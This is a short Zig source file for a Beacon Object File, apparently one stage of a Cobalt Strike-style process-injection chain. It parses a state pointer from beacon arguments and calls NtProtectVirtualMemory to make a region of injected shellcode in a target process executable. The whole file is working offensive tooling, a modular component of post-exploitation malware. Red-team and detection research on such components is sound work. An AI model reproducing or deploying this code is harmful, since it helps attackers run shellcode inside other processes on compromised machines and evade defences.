const std = @import("std");
const beacon = @import("bof_api").beacon;
const w32 = @import("bof_api").win32;
const shared = @import("wInjectionChainShared.zig");

pub export fn go(args: ?[*]u8, args_len: i32) callconv(.C) u8 {
    var parser = beacon.datap{};
    beacon.dataParse(&parser, args, args_len);

    var state: *shared.State = blk: {
        const mem = beacon.dataExtract(&parser, null).?[0..@sizeOf(usize)];
        break :blk @ptrFromInt(std.mem.readInt(usize, mem, .little));
    };

    const base_address: *?w32.PVOID = @ptrCast(&state.base_address);
    var bytes_to_protect: w32.SIZE_T = state.shellcode_len;
    var old_protection: w32.ULONG = 0;
    state.nt_status = w32.NtProtectVirtualMemory(
        state.process_handle,
        base_address,
        &bytes_to_protect,
        w32.PAGE_EXECUTE_READ,
        &old_protection,
    );

    return 0;
}
